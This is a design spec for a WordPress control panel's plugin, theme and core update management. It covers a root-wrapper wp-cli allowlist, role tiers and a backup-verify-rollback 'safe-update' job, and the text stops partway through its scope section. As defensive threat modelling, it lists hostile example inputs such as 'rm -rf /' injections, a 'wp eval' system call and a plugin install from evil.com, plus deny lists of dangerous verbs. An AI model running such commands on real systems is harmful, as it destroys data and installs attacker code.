# Feature #4 — Plugin/Update Management + Safe-Update: Design Spec

**Status:** Finalized (owner decisions resolved) · **Effort:** M (+S safe-update)
**Originated:** 2026-06-23 · **Finalized:** 2026-06-24
**Branch:** branch from `main` **after** feature #3 (Insights) merges (Insights is
in flight on `control-panel-insights`). #4 consumes only the stable
`plugins[]` / `themes[]` / `wp_core` fields of the insights contract, so it can be
built in parallel against fixtures and wired to live data once #3 lands.
**Stakes:** HIGH — this is the highest-care allowlist widening in the wave.

---

## 0. Resolved owner decisions (2026-06-24)

These were the open items in the 2026-06-23 draft. They are now settled.

| # | Decision | Resolution | Effect on this spec |
|---|----------|-----------|---------------------|
| 1 | Install new plugins/themes from the panel? | **No — drop the install feature entirely.** Owner: "ignore this plugin installer — pointless." Owners add plugins via wp-admin (the normal WP path); the panel manages what already exists. | `install` is removed from the wrapper verb allowlist, from `VIBE_OPS`, from the routers, and from the UI. ZIP-URL install is moot (the verb does not exist). The root surface shrinks. |
| 2 | Auto-update default when unset? | **Off / opt-in.** Matches WP core; nothing updates unattended unless explicitly enabled per item. | Toggles default to "following WP default (off)"; core auto-updates stay at WP's `minor` unless changed. |
| 3 | Operator vs admin tiers | **Operators may update everything, including core** (owner: "let core be updated"). Operator: activate / deactivate / update (plugin/theme/**core**) / auto-update toggle / safe-update / schedule. Admin: the two *irreversible-from-the-panel* actions — `delete` and standalone arbitrary-backup restore. (`install` removed.) | Tiers come from a single `WP_ACTION_TIERS` map (§3.5) — future-proof, one place to audit/adjust. **No behavior change** to the existing `updatesApply`: it is already `operatorProcedure` for both core and plugins, and stays that way. |
| 4 | Who can run safe-update? | **Operators may.** Refined for least privilege: `safeUpdate` is an **operator** procedure; its auto-rollback restore runs as an **internal step of the compound job** (authorized by the safe-update gate), so the standalone "restore any backup" action **stays admin-only**. Operators get safe-update without widening who can trigger an arbitrary destructive restore. | §3.5, §4.4. |
| 5 | TTFB regression threshold | **Hardcoded 3000 ms default, overridable** per site via `VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS`. | §4.3. |
| 6 | Scheduled auto-update cadence | **Off / Weekly / Daily.** | §3.7. |
| 7 | Bulk "update all safely" sequencing | **Sequential**, one pre-run backup for the batch, stop on first failure. | §4.4. |

---

## 1. Context — what exists today

### 1.1 Current wp exposure (four exact forms)

The panel's entire `wp` surface is locked to four exact strings inside
`validate_wp_args` in `bin/vibe-panel-run` (the original three plus the feature-#3
insights cron-trigger, which has already landed on `main`):

```sh
"core update"                                  # updatesApply (core)
"plugin update --all"                          # updatesApply (plugins)
"plugin list --update=available --format=json" # updatesAvailable
"cron event run vibe_insights_collect_cron"    # insightsRefresh (feature #3)
```

Everything else — `eval`, `eval-file`, `db`, `shell`, `config`, `search-replace`,
`plugin activate`, `plugin install`, `plugin delete`, theme operations — is
explicitly rejected with `die "wp subcommand not allowed: wp $joined"`.

**The wrapper rewrite (§3.2) MUST preserve all four existing forms byte-for-byte** —
dropping `plugin list …` breaks the update count, and dropping the `cron event run`
form breaks #3's on-demand refresh.

In `control-panel/packages/api/src/core-bridge/exec.ts` these map to three
`VIBE_OPS` entries:

```typescript
wpCoreUpdate:      { argv: ["wp", "core", "update"], stream: true }
wpPluginUpdateAll: { argv: ["wp", "plugin", "update", "--all"], stream: true }
wpPluginUpdates:   { argv: ["wp", "plugin", "list", "--update=available", "--format=json"], stream: false }
```

`updatesAvailable` (in `routers/updates.ts`) calls `wpPluginUpdates` to return a
count; `updatesApply` starts a job for `wpCoreUpdate` or `wpPluginUpdateAll`.

`plugin install` remains permanently blocked (owner decision #1) — it is never
added to the allowlist.

### 1.2 Backup/restore/smoke primitives (already exist, not new)

| Primitive | Where | What it does |
|-----------|-------|-------------|
| `backup` / `backupLocal` | `bin/backup`, `VIBE_OPS.backup` | DB dump + wp-content archive → local + optional R2 |
| `restore` | `bin/restore`, `VIBE_OPS.restore` | Replaces DB + wp-content from a backup dir; requires `--yes`; auto-fetches from R2 |
| `smoke` | `bin/smoke`, `VIBE_OPS.smoke` | doctor-runtime + HTTP 200 + FastCGI HIT + upload write test |
| `backups` | `bin/vibe` / `backups` op | Lists backup dirs as newline-delimited paths |

These four primitives are the substrate for safe-update. No new shell scripting is
needed for the core flow.

### 1.3 Inventory comes from feature #3

The companion "Insights" plugin (`vibe-wp-insights.php`, specified in
`docs/superpowers/specs/2026-06-23-feature-3-insights-plugin-design.md`) writes
`wp-content/.vibe/insights.json` with the full plugin and theme inventory — slug,
name, version, status (active/inactive/must-use/dropin), `update_available`,
`new_version`, `auto_update`. The panel reads it via the `insights` op (a `cat`
through the root boundary) and parses it with `parse-insights.ts`. Feature #4
consumes `insights.plugins[]`, `insights.themes[]`, and `insights.wp_core`
directly; it adds NO new `wp plugin list` call.

These fields are stable in the #3 contract regardless of how #3 resolves its own
open decisions (e.g. dropping `_vuln_join_keys` — that block is for Extra E, not
#4). So #4 is decoupled from #3's internal choices.

**Current landing status (2026-06-24):** #3's data plumbing is already on `main` —
`core-bridge/parse-insights.ts` (Zod schema + `parseInsights`), the
`vibe-wp-insights.php` mu-plugin, the `insights` op in `bin/vibe` /
`bin/vibe-panel-run` (`OP_ALLOWLIST`) / `exec.ts` `VIBE_OPS`, and an
`insightsRefresh` op (`wp cron event run vibe_insights_collect_cron`). Only #3's
tRPC router (`routers/insights.ts`) is not yet merged. Therefore #4 wires to **real**
inventory (no fixture seam): it imports `Insights` + `parseInsights` from
`parse-insights.ts` and adds a thin `core-bridge/insights.ts` read helper
(`readInsights(installDir, env) → Insights | null`) that runs the existing
`insights` op and parses it. #4 does **not** create or edit `routers/insights.ts`
(that is #3's file) to avoid a merge collision; its only edits to shared files
(`exec.ts` `VIBE_OPS`, `bin/vibe-panel-run`, the root router registration,
`bin/vibe`) are additive.

---

## 2. Decisions (settled)

| Decision | Chosen | Rationale |
|----------|--------|-----------|
| Inventory source | `insights.json` drop-file (feature #3) | Already planned, zero new wp-cli exposure, richer data |
| Per-item allowlist shape | Structured verb × slug regex, NOT a new flat string list | Exhaustive without requiring one string per future plugin; still validated at the wrapper |
| Slug/version validation layer | Wrapper (`vibe-panel-run`) AND panel (`exec.ts`) | Defense-in-depth: distrust the panel; the wrapper is the root boundary |
| Install new plugins/themes | **Not exposed** (owner decision #1) | Owners install via wp-admin; removing it shrinks the root surface and eliminates the ZIP-URL RCE class entirely |
| Permission tiers | Operator: `activate`/`deactivate`/`update` (incl. core)/auto-update toggle/safe-update/schedule. Admin: `delete` + standalone restore. Driven by one `WP_ACTION_TIERS` map. | Operators own routine maintenance (incl. core, matching shipped behavior); admin owns only the actions with no panel-side undo (`install` is gone, so `delete` cannot be reversed from the panel) |
| Safe-update tier | **operator** procedure; internal restore is a compound-job step (owner decision #4) | Operators can safe-update; standalone arbitrary-backup restore stays admin |
| Safe-update flow | backup → update → smoke+TTFB → auto-restore | Assembled from existing ops; no new shell scripting |
| Screenshot diff | Out of scope (later add-on) | HTTP+TTFB+smoke covers ~80% cheaply; headless Chromium is a separate effort |
| Auto-update mechanism | WP's own `auto_update_plugins`/`auto_update_themes` options via `wp plugin auto-updates enable/disable <slug>` | Uses the canonical WP mechanism; avoids a parallel scheduler |
| Auto-update default | **Off / opt-in** (owner decision #2) | Matches WP core; nothing updates unattended unless enabled |
| Scheduled updates | Ride the existing systemd-timer pattern (`backup-schedule-apply`) | One new `auto-update-schedule-apply` op; no new infrastructure |
| Theme parity | Themes get full feature parity with plugins (minus install) | Same verbs, same allowlist structure, same UI treatment |

---

## 3. Architecture & components

### 3.1 Inventory from feature #3 (no new wp-cli exposure)

The `insights` op (added by feature #3) reads `wp-content/.vibe/insights.json` and
returns it through the `vibe-panel-run` boundary via a `cat`. The panel parses it
with the Zod schema in `parse-insights.ts` and exposes `plugins[]` and `themes[]`
arrays to the UI. Feature #4 reads these arrays directly for its table views.

**Nothing in feature #4 needs a new read-only wp-cli query.** The inventory is
entirely supplied by the drop-file.

### 3.2 The structured wp allowlist (the highest-care change)

Replace the three hardcoded strings in `validate_wp_args` with a structured
two-layer check. **No `install` verb** (owner decision #1).

**Allowed verbs** (exhaustive, no catch-all):

| Namespace | Verbs |
|-----------|-------|
| `plugin` | `activate`, `deactivate`, `update`, `delete`, `auto-updates` |
| `theme` | `activate`, `update`, `delete`, `auto-updates` |
| `core` | `update`, `version` |

**Slug argument rules** (when a verb takes one):

- Exactly one argument (no multi-slug glob expansion).
- Must match the slug regex: `^[a-z0-9][a-z0-9-]{0,62}$` — lowercase alphanumeric
  and hyphens only, 1–63 characters. No `/`, no `.`, no `..`, no whitespace.
- For `auto-updates`, a second argument of exactly `enable` or `disable` is
  required. The slug comes first, the subverb second.
- For `core update` and `core version`: no free argument (the existing behavior).
- An optional `--version=x.y.z` flag is allowed for `update` (plugin/theme) and
  `core update`; the value must match `^[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-zA-Z0-9.]+)?$`.
- The URL guard in `validate_wp_slug` (`*://*` → die) is retained as
  defense-in-depth even though no install verb exists, so a malformed slug that
  looks like a URL is still rejected loudly.

**Forbidden at the wrapper regardless of panel-side checks:**

- Any arg beginning with `--path`, `--url`, `--require`, `--exec`, or `--skip-plugins`.
- Any arg containing `/`, `..`, `;`, `|`, `&`, `$`, backtick, `<`, `>`, `(`, `)`,
  `{`, `}`, `*`, `?`, `!`, or whitespace.
- The verbs `eval`, `eval-file`, `db`, `shell`, `config`, `search-replace`,
  `option`, `user`, `site`, `import`, `export`, `scaffold`, `package`,
  `server`, `cron`, **`install`** — blocked even if the panel somehow sends them.

**New `validate_wp_args` logic (pseudocode):**

```sh
validate_wp_args() {
  # $1 = namespace, $2 = verb, $3 = optional slug/subverb, $4 = optional flag
  # Fast-path: the pre-existing FIXED forms keep working byte-for-byte. This block
  # MUST list every form already in the shipped wrapper so nothing regresses —
  # the panel update/list forms AND the feature-#3 insights cron-trigger.
  joined="$*"
  case "$joined" in
    "core update") return 0 ;;
    "plugin update --all") return 0 ;;
    "plugin list --update=available --format=json") return 0 ;;
    "cron event run vibe_insights_collect_cron") return 0 ;;
  esac
  # Structured per-item forms (feature #4). `cron` is NOT a general namespace — only
  # the one fixed cron form above is allowed; anything else under cron dies below.
  namespace="$1"; verb="$2"
  case "$namespace" in
    plugin|theme|core) ;;
    *) die "wp namespace not allowed: $namespace" ;;
  esac
  case "$namespace $verb" in
    "plugin activate"|"plugin deactivate"|"plugin update"|\
    "plugin delete"|"plugin auto-updates"|\
    "theme activate"|"theme update"|\
    "theme delete"|"theme auto-updates"|\
    "core update"|"core version") ;;
    *) die "wp subcommand not allowed: wp $namespace $verb" ;;
  esac
  # Slug argument (when expected)
  case "$namespace $verb" in
    "core update"|"core version")
      # Optional --version= flag allowed for core update
      if [ $# -ge 3 ]; then
        validate_wp_version_flag "${3:-}"
      fi
      return 0 ;;
    "plugin auto-updates"|"theme auto-updates")
      slug="${3:-}"; subverb="${4:-}"
      validate_wp_slug "$slug"
      case "$subverb" in
        enable|disable) ;;
        *) die "wp auto-updates subverb must be enable or disable" ;;
      esac
      [ $# -le 4 ] || die "wp auto-updates takes at most 4 args"
      return 0 ;;
  esac
  slug="${3:-}"
  [ -n "$slug" ] || die "wp $namespace $verb requires a slug argument"
  validate_wp_slug "$slug"
  # Optional --version= for update only
  if [ $# -ge 4 ]; then
    validate_wp_version_flag "${4:-}"
    [ $# -le 4 ] || die "too many arguments for wp $namespace $verb"
  else
    [ $# -le 3 ] || die "too many arguments for wp $namespace $verb"
  fi
}

validate_wp_slug() {
  slug="$1"
  case "$slug" in
    *://*) die "wp slug must not be a URL" ;;
    *[^a-z0-9-]*|''|"-"*) die "wp slug fails regex: $slug" ;;
  esac
  [ "${#slug}" -le 63 ] || die "wp slug too long: $slug"
}

validate_wp_version_flag() {
  flag="$1"
  case "$flag" in
    --version=*) val="${flag#--version=}" ;;
    *) die "only --version= flag allowed here, got: $flag" ;;
  esac
  # Basic semver: 1.2 or 1.2.3 or 1.2.3-beta.1
  case "$val" in
    [0-9]*.[0-9]*) ;;
    *) die "--version= value is not a valid version: $val" ;;
  esac
}
```

### 3.3 New `VIBE_OPS` entries (exec.ts)

Each new per-item action maps to a `VIBE_OPS` entry with `takesArg: true`.
The panel side validates slug + verb before building argv; the wrapper revalidates.
**No `wpPluginInstall` / `wpThemeInstall`** (owner decision #1).

```typescript
// Per-item plugin ops
wpPluginActivate:      { argv: ["wp", "plugin", "activate"],     stream: true,  takesArg: true }
wpPluginDeactivate:    { argv: ["wp", "plugin", "deactivate"],   stream: true,  takesArg: true }
wpPluginUpdate:        { argv: ["wp", "plugin", "update"],       stream: true,  takesArg: true }
wpPluginDelete:        { argv: ["wp", "plugin", "delete"],       stream: true,  takesArg: true }
wpPluginAutoUpdatesEnable:  { argv: ["wp", "plugin", "auto-updates", "enable"],  stream: false, takesArg: true }
wpPluginAutoUpdatesDisable: { argv: ["wp", "plugin", "auto-updates", "disable"], stream: false, takesArg: true }

// Per-item theme ops
wpThemeActivate:       { argv: ["wp", "theme", "activate"],      stream: true,  takesArg: true }
wpThemeUpdate:         { argv: ["wp", "theme", "update"],        stream: true,  takesArg: true }
wpThemeDelete:         { argv: ["wp", "theme", "delete"],        stream: true,  takesArg: true }
wpThemeAutoUpdatesEnable:  { argv: ["wp", "theme", "auto-updates", "enable"],   stream: false, takesArg: true }
wpThemeAutoUpdatesDisable: { argv: ["wp", "theme", "auto-updates", "disable"],  stream: false, takesArg: true }

// Core version read (non-mutating, no streaming needed)
wpCoreVersion:         { argv: ["wp", "core", "version"],        stream: false }
```

The `buildVibeArgv` function's existing `takesArg` guard and the `startsWith("-")`
flag-refusal stay in place. The slug arrives as `args[0]`; `buildVibeArgv` appends
it after the fixed `argv` array.

### 3.4 Panel-side slug validation (exec.ts / routers layer)

Before calling `buildVibeArgv`, every per-item router handler validates the slug
with the same regex used in the wrapper:

```typescript
const SLUG_RE = /^[a-z0-9][a-z0-9-]{0,62}$/;
function assertSlug(slug: string, label: string): void {
  if (!SLUG_RE.test(slug)) {
    throw new Error(`Invalid ${label} slug: ${slug}`);
  }
}
```

This is defense-in-depth — the wrapper is authoritative, but catching bad input
early gives a cleaner error message to the UI.

### 3.5 Per-item routers (`routers/plugins.ts` and `routers/themes.ts`)

Two new routers, mirroring the shape of `routers/updates.ts`:

```typescript
// routers/plugins.ts (sketch — not implementing yet)
export const pluginsRouter = {
  // Read: consumed from insights drop-file (no new op)
  pluginsList: protectedProcedure
    .input(z.object({ siteId: z.string() }))
    .handler(async ({ input }) => {
      const insights = await getInsights(input.siteId);  // feature #3 op
      return insights.plugins;
    }),

  // Tier comes from WP_ACTION_TIERS via procedureFor() — no hardcoded tier per line.
  pluginActivate:   procedureFor("plugin.activate")   ...  // wpPluginActivate
  pluginDeactivate: procedureFor("plugin.deactivate") ...  // wpPluginDeactivate
  pluginUpdate:     procedureFor("plugin.update")     ...  // wpPluginUpdate (also via safeUpdate)
  pluginDelete:     procedureFor("plugin.delete")     ...  // wpPluginDelete  — resolves to admin

  pluginAutoUpdate: procedureFor("plugin.autoUpdate")     // enable/disable per toggle
    .input(z.object({ siteId: z.string(), slug: z.string(), enabled: z.boolean() }))
    ...

  safeUpdate:       procedureFor("safeUpdate")        ...  // §4 — internal restore is a job step
};
```

#### Permission model — one centralized, auditable map (future-proof)

Rather than scatter `operatorProcedure` / `adminProcedure` across handlers (where a
miswired tier is easy to introduce and hard to audit), feature #4 defines a single
source of truth that every router consults. Adjusting a tier or adding an action is
a one-line, reviewable change — and the security review (§5.3) has exactly one place
to read the whole policy.

```typescript
// control-panel/packages/api/src/core-bridge/wp-actions.ts
export type Role = "viewer" | "operator" | "admin";

// Minimum role required for each mutating wp action.
export const WP_ACTION_TIERS = {
  "plugin.activate":    "operator",
  "plugin.deactivate":  "operator",
  "plugin.update":      "operator",
  "plugin.autoUpdate":  "operator",
  "plugin.delete":      "admin",      // no panel-side re-install (install dropped)
  "theme.activate":     "operator",
  "theme.update":       "operator",
  "theme.autoUpdate":   "operator",
  "theme.delete":       "admin",
  "core.update":        "operator",   // matches the shipped updatesApply tier
  "safeUpdate":         "operator",   // the safe wrapper; restore is an internal step
  "schedule.autoUpdate":"operator",
} as const satisfies Record<string, Role>;

// Roles are hierarchical (viewer < operator < admin), reusing the existing
// requireRole() in procedures.ts. A helper maps a tier to the right procedure:
export function procedureFor(action: keyof typeof WP_ACTION_TIERS) {
  return WP_ACTION_TIERS[action] === "admin" ? adminProcedure : operatorProcedure;
}
```

Resulting tiers:

- **viewer / protected** (any authenticated user): read inventory, versions, health.
- **operator**: activate, deactivate, update (plugin / theme / **core**), auto-update
  toggle, **safe-update** (incl. core), scheduled-update config, "Update all" /
  "Update all (safely)".
- **admin**: the two actions with no panel-side undo — `delete` (plugin/theme) and
  the standalone arbitrary-backup restore (`backupsRestore`, unchanged).

(No `install` action exists at any tier.)

**No change to the shipped `updatesApply`.** It is already `operatorProcedure` for
both `core` and `plugins`; core stays operator. Reading the tier from
`WP_ACTION_TIERS["core.update"]` keeps it consistent and makes a future change (if
ever wanted) a single-line edit reviewed in one spot.

**Rationale for the admin line.** With `install` removed, a panel `delete` cannot be
reversed from the panel (only via wp-admin), and a standalone restore overwrites the
live DB + content from an arbitrary snapshot. Those are the two irreversible-from-
the-panel actions, so they carry the admin gate. Everything else is routine
maintenance or runs behind the safe-update backup/rollback wrapper.

### 3.6 Auto-update toggles

Each `plugins[]` entry in `insights.json` carries `auto_update: boolean | null`
(null = WP default = off, per decision #2). The UI renders a per-row toggle.
Toggling calls `wpPluginAutoUpdatesEnable` or `wpPluginAutoUpdatesDisable` with the
slug. These are non-streaming (`stream: false`) — they complete quickly.

The site-wide `signals.auto_update_core` field from insights feeds a separate
"WordPress core auto-updates" control (values: `minor`, `major`, `off`). This
translates to `WP_AUTO_UPDATE_CORE` constant manipulation — handled by
`site-config-apply` (the env-file writer op), not by `wp` directly.

### 3.7 Scheduled auto-updates (existing timer pattern)

A new `auto-update-schedule-apply` bin op (modeled on `backup-schedule-apply`)
installs/removes a systemd timer (`vibe-wp-autoupdate-<slug>-<env>.timer`) that
runs `./bin/vibe <env> wp plugin update --all` on a schedule. The panel exposes
a "Scheduled plugin updates" control: **Off / Weekly / Daily** (decision #6).

This is the same systemd pattern already in production for backup and monitor.
No new infrastructure needed; the timer runs the already-allowed
`plugin update --all` form.

### 3.8 Cross-cutting rule (from ROADMAP)

Every new panel→host capability = a new `bin/vibe` op + a `VIBE_OPS` entry in
`exec.ts` + an allowlist token in `vibe-panel-run` with argument re-validation at
the root boundary. This is non-negotiable for the wp allowlist widening.

### 3.9 Future-proofing (designed-in extensibility)

The point of the structured allowlist + centralized tier map is that the *next*
features (#5 perf, Extra C security score, Extra E vuln radar) extend this surface
without reopening the security design. The extension points are explicit:

- **Adding a wp verb later is a fixed 6-step checklist** — not an ad-hoc change.
  To add a verb (say `plugin verify-checksums`): (1) add the `namespace verb` arm to
  the `case` in `validate_wp_args`; (2) add a `VIBE_OPS` entry; (3) add the
  `OP_ALLOWLIST` token in `vibe-panel-run`; (4) add a `WP_ACTION_TIERS` entry; (5)
  add positive + injection tests to the BATS suite; (6) re-run the §5.3 wrapper
  security review for the delta. Document this checklist beside the `case` block so
  no one widens the root surface informally. `eval` / `db` / `config` / `shell` /
  `install` remain permanently off the table (§5.4).
- **One tier map, hierarchical roles.** New actions add one line to
  `WP_ACTION_TIERS`. If a finer-grained role is ever needed (e.g. a "maintainer"
  between operator and admin), it is added once to the role enum + `requireRole`
  ordering and the map values; handlers do not change. Tiers are never hardcoded per
  handler.
- **Version-pinned updates are already supported** (`--version=` on `update`). This
  is the seam a later "roll forward/back to a specific version" or "staged update"
  feature builds on — no new wrapper surface needed.
- **Native WP mechanisms, not parallel ones.** Auto-updates use WP's own
  `auto_update_plugins`/`auto_update_themes` options and `WP_AUTO_UPDATE_CORE`;
  scheduling rides the existing systemd-timer pattern. Future WP behavior is
  inherited rather than reimplemented.
- **Persisted records follow the existing contract.** Any new durable state (e.g. a
  safe-update job row, a schedule record) uses the existing Drizzle schema patterns
  in `packages/db` and the insights `schema_version` discipline (degrade gracefully
  on unknown versions), so schema evolution never hard-breaks the panel.
- **Insights coupling stays minimal.** #4 reads only `plugins[]`, `themes[]`,
  `wp_core`, and `signals.auto_update_core`. New insights fields are additive; #4 is
  unaffected by them, and is unaffected by #3's own internal decisions.

---

## 4. Safe-update job

The flagship of this feature: a single `safeUpdate` compound job that auto-restores
on regression. Assembled entirely from existing ops; no new shell scripting.
**Operator-accessible** (decision #4) — the auto-rollback restore is an internal
step of this job, not the admin-gated standalone restore action.

### 4.1 Flow

```
safeUpdate(siteId, env, target)
  │
  ├─ 1. Pre-update backup
  │     op: backup (or backupLocal if R2 not configured)
  │     wait for completion; capture backupId from output
  │     on failure → abort, surface "could not take pre-update backup"
  │
  ├─ 2. Apply update
  │     target = "core"       → op: wpCoreUpdate
  │     target = "plugins"    → op: wpPluginUpdateAll
  │     target = <slug>       → op: wpPluginUpdate(slug) or wpThemeUpdate(slug)
  │     on failure → abort (no restore needed; nothing changed)
  │
  ├─ 3. Verify
  │     3a. op: smoke          (doctor-runtime + HTTP 200 + FastCGI HIT + upload check)
  │     3b. HTTP TTFB check    (inline curl: homepage + /wp-admin/; threshold from §4.3)
  │     all checks pass → 4a. success path
  │     any check fails → 4b. failure path
  │
  ├─ 4a. Success
  │      mark job "succeeded"; emit summary (what updated, verify results)
  │      invalidate insights cache (stale until next cron write)
  │
  └─ 4b. Failure → Auto-restore
         op: restore(backupId, --yes)   ← internal job step (authorized by safeUpdate's
                                           operator gate, NOT the standalone admin restore)
         wait for completion
         re-run smoke (confirm restore succeeded)
         mark job "failed" + emit rollback receipt
         surface failure reason + restore confirmation to the UI
```

### 4.2 Implementation as a compound job

`safeUpdate` is a new `startJob`-style function in `core-bridge/jobs.ts` (or a thin
wrapper over `launchJob`). It cannot use the existing single-op `streamVibe` model
directly because it is a multi-step sequence. Instead it chains `runVibe` calls
(non-streaming, awaited) and emits structured log lines to a `LineStream` between
steps, with a final `streamVibe` call for the update step itself (so its output
streams live to the UI).

**Key implementation notes:**

- The job is persisted and audited as a single job row of `kind: "safeUpdate"`.
- Each sub-step pushes labelled progress lines (`[backup]`, `[update]`, `[smoke]`,
  `[restore]`, `[done]`) to the `LineStream` so the UI can display a timeline.
- The backup step uses `runVibe(…, "backupLocal", …)` if R2 is not configured;
  it captures the backup path from stdout (`Backup written to <path>`).
- The restore step re-uses `VIBE_OPS.restore` (which already appends `--yes`). It is
  reached only inside the compound job; the standalone `backupsRestore` procedure
  stays `adminProcedure`.
- The entire compound job has a single `timeoutMs` ceiling (suggest 45 minutes:
  15 backup + 10 update + 5 verify + 15 restore worst-case).

### 4.3 TTFB check (inline, no new op)

The TTFB check in step 3b is a short curl inside the job runner. The threshold is
3000 ms by default, overridable per site via `VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS`
(decision #5):

```typescript
const threshold = Number(env.VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS ?? 3000);
const start = Date.now();
const res = await fetch(siteUrl + "/");
const ttfb = Date.now() - start;
if (!res.ok || ttfb > threshold) { /* trigger restore */ }
```

This runs from the panel server (not from inside Docker), so it tests the real
external path through Nginx. Admin path: `siteUrl + "/wp-login.php"`.

No new `vibe-panel-run` surface is required — the panel process already has outbound
network access.

### 4.4 Triggering safe-update

- **Per-item row action:** "Update safely" button on a plugin row → `safeUpdate`
  with `target = <slug>`.
- **Bulk:** "Update all (safely)" button → `safeUpdate` with `target = "plugins"`.
  Bulk is **sequential**, one pre-run backup for the whole batch, **stop on first
  failure** and auto-restore that batch (decision #7). Not one backup per plugin,
  not parallel.
- Safe-update is **operator-accessible** (decision #4). Operators may also update
  without the safe wrapper via the regular `updatesApply`.

---

## 5. Security model

### 5.1 Why this widening is the highest-care in the wave

The `validate_wp_args` function in `bin/vibe-panel-run` is a **root boundary**. A
single escaped metacharacter, a missed allowed-verb branch, or a `--path=/tmp/evil`
injection could hand arbitrary code execution as root to whoever controls the panel.
This is the same threat class as a sudo bypass.

The existing three-form lock exists precisely because the authors did not want to
enumerate a larger surface without a formal security review. This spec now provides
that enumeration — and the implementation requires a **dedicated wrapper security
review** before merge. Dropping `install` (decision #1) removes the single highest-
risk verb (the ZIP-URL RCE class) from the surface entirely.

### 5.2 Threat model for the widened allowlist

| Threat | Mitigation |
|--------|-----------|
| Injecting shell metacharacters via slug (`; rm -rf /`) | `validate_wp_slug` regex `^[a-z0-9][a-z0-9-]{0,62}$` strips all metacharacters at the wrapper; `validate_arg`'s `[\;\|\&\$\`\<\>\(\)\{\}\*\?\!]` guard also applies before the wp branch |
| Supplying a `--path=/evil` to make wp-cli act on a different install | Explicit blocked-flag check in `validate_wp_args`: any arg starting with `--path`, `--url`, `--require`, or `--exec` is rejected |
| Passing multiple slugs / glob expansion (`*`) | `validate_wp_slug` rejects `*`; the arg count check (`[ $# -le 3 ]`) prevents two slug args |
| Activating a dangerous verb (`wp eval "system('rm -rf /')"`) | Verb allowlist is exhaustive and matched with `case ... esac`; no catch-all branch |
| ZIP-URL install (`wp plugin install https://evil.com/backdoor.zip`) | `install` is not an allowed verb at all (decision #1) — rejected at the namespace/verb `case`; the `validate_wp_slug` `://` guard is a second line of defense |
| `--version=` injection (`--version=1.0;rm -rf /`) | `validate_wp_version_flag` parses only the value after `=` and requires it to match the semver pattern |
| Panel bypassing the wrapper entirely | Not possible: the panel runs as `vibe-panel` (unprivileged); only `sudo -n <runner>` reaches root, and `<runner>` is the hard-coded wrapper binary |
| Panel rewriting the wrapper binary | Wrapper is `root:root 0755` with `assert_root_owned` checks; `vibe-panel` cannot write it |
| Operator escalating to an admin op (`delete` / standalone restore) | Tier resolved from `WP_ACTION_TIERS` and enforced at the tRPC procedure level (`adminProcedure` via `procedureFor`) BEFORE the op reaches the wrapper; one map to audit |
| Operator triggering an arbitrary destructive restore | Standalone `backupsRestore` stays `adminProcedure`; the only restore an operator can cause is safe-update's auto-rollback to the snapshot taken seconds earlier in the same job |

### 5.3 What the wrapper security review must cover

A reviewer independent of the implementation must:

1. Walk every branch of the new `validate_wp_args` and confirm no branch can be
   reached with an unvalidated free-form string in the final exec argument.
2. Confirm `validate_wp_slug` is called on ALL paths that produce a slug argument,
   not just some.
3. Confirm the blocked-flag check (`--path`, `--url`, etc.) fires before the slug
   check so a crafted `--path` cannot mask itself as a slug.
4. Confirm `install` (and every other excluded verb) is unreachable.
5. Run the injection test suite (§10) against the deployed wrapper.
6. Review any change to `OP_ALLOWLIST` and `FLAG_ALLOWLIST` for unintended surface.

### 5.4 No `eval`, no `db`, no `config`, no `shell`, no `install` — ever

These verbs are permanently blocked. They are not "deferred" — they are off the
table. `eval` and `eval-file` would reduce the entire allowlist to a no-op.
`db` gives direct SQL. `shell` is trivially `exec sh`. `config` reads/writes
wp-config.php (secrets). `search-replace` can rewrite arbitrary DB content.
`install` is excluded by owner decision (#1) — a panel "upload ZIP" flow, if ever
wanted, requires a separate quarantine design (signature + scan + manual approval),
not a wp-cli expansion.

---

## 6. UI surface

### 6.1 Plugins tab (new, under the site's Updates or Plugins section)

A table with one row per plugin from `insights.plugins[]`:

| Column | Source | Notes |
|--------|--------|-------|
| Name | `insights.plugins[].name` | With slug below in muted text |
| Status | `insights.plugins[].status` | "Active" / "Inactive" / "Must-use" / "Drop-in" badge |
| Version | `insights.plugins[].version` | Current; "→ 1.2.3" in amber when update available |
| Auto-update | `insights.plugins[].auto_update` | Toggle (null = WP default = off, per decision #2) |
| Actions | — | Per-row dropdown: Activate / Deactivate / Update / Update safely / Delete |

- Row with `update_available: true` gets an amber highlight.
- "Must-use" and "Drop-in" rows suppress Activate/Deactivate (greyed out).
- **No "Add plugin" button** (decision #1) — plugins are installed via wp-admin and
  appear here on the next insights refresh. A short helper line can point owners to
  wp-admin → Plugins → Add New.
- `Delete` is admin-only (suppressed/greyed for non-admins).
- A "Update all (safely)" primary button above the table triggers `safeUpdate`
  (sequential, one batch backup) for all plugins with `update_available: true`.
- A "Update all" secondary button triggers `wpPluginUpdateAll` (no rollback;
  operator-accessible).

### 6.2 Themes tab

Identical structure, minus install. `activate` is present only on inactive themes
(one active theme at a time). No `deactivate` (WP does not allow deactivating the
active theme via wp-cli — the panel hides/disables that action for the active
theme). `delete` is admin-only, suppressed for the active theme.

### 6.3 Core update card

Lives in the existing Updates section (or a "WordPress Core" card). Shows current
version from `insights.wp_core.version` and new version from
`insights.wp_core.new_version`. Buttons: "Update" (operator, current `wpCoreUpdate`)
and "Update safely" (operator, safe-update compound job — the recommended default
for core). Auto-update setting shows `signals.auto_update_core` with a selector
(minor / major / off).

### 6.4 Safe-update job progress UI

Reuses the existing streaming job UI (the same `<StreamingJobView>` component used
by backup/restore/update-all). The `LineStream` emits labelled sections:

```
[backup]  Taking pre-update snapshot...
[backup]  Backup written to backups/prod/20260623T141500Z
[update]  Updating woocommerce...
[update]  Success: woocommerce updated from 9.1.2 to 9.2.0
[smoke]   Running smoke tests...
[smoke]   ok: runtime doctor
[smoke]   ok: HTTP request succeeds
[smoke]   ok: Nginx FastCGI cache reaches HIT
[ttfb]    Homepage TTFB: 142ms ✓
[done]    Update succeeded. Snapshot retained: 20260623T141500Z
```

On rollback:

```
[smoke]   failed: Nginx FastCGI cache did not reach HIT
[restore] Smoke failed — auto-restoring from 20260623T141500Z...
[restore] Restore complete.
[smoke]   Post-restore smoke: passed.
[done]    Update rolled back. Site is on woocommerce 9.1.2. Check error logs.
```

---

## 7. Scope / out-of-scope

### In scope (this feature)

- Structured wp allowlist widening in `vibe-panel-run` + matching `VIBE_OPS` entries
- Per-item plugin ops: activate, deactivate, update, delete
- Theme parity: activate, update, delete
